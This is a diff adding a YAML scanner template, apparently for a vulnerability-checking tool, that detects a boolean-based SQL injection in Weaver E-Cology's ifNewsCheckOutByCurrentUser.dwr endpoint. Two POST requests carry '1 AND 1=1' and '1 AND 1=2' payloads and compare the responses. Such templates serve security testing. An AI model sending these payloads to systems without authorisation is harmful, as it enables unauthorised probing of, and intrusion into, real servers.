@@ -1,0 +1,48 @@
+id: ecology-ifnewscheckoutbycurrentuser-dwr-sqli
+
+info:
+  name: 泛微 E-Cology ifnewscheckoutbycurrentuser.dwr SQL 注入
+  author: zan8in
+  severity: high
+  verified: true
+  tags: ecology,sqli
+  created: 2023/09/03
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr
+      headers:
+        Content-Type: text/plain
+      body: |
+        callCount=1
+        page=
+        httpSessionId=
+        scriptSessionId=
+        c0-scriptName=DocDwrUtil
+        c0-methodName=ifNewsCheckOutByCurrentUser
+        c0-id=0
+        c0-param0=string:1 AND 1=1
+        c0-param1=string:1
+        batchId=0
+    expression: response.status == 200 && response.body.bcontains(b"dwr.engine._remoteHandleCallback('0','0',true)")
+  r1:
+    request:
+      method: POST
+      path: /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr
+      headers:
+        Content-Type: text/plain
+      body: |
+        callCount=1
+        page=
+        httpSessionId=
+        scriptSessionId=
+        c0-scriptName=DocDwrUtil
+        c0-methodName=ifNewsCheckOutByCurrentUser
+        c0-id=0
+        c0-param0=string:1 AND 1=2
+        c0-param1=string:1
+        batchId=0
+    expression: response.status == 200 && response.body.bcontains(b"dwr.engine._remoteHandleCallback('0','0',false)")
+expression: r0() && r1()
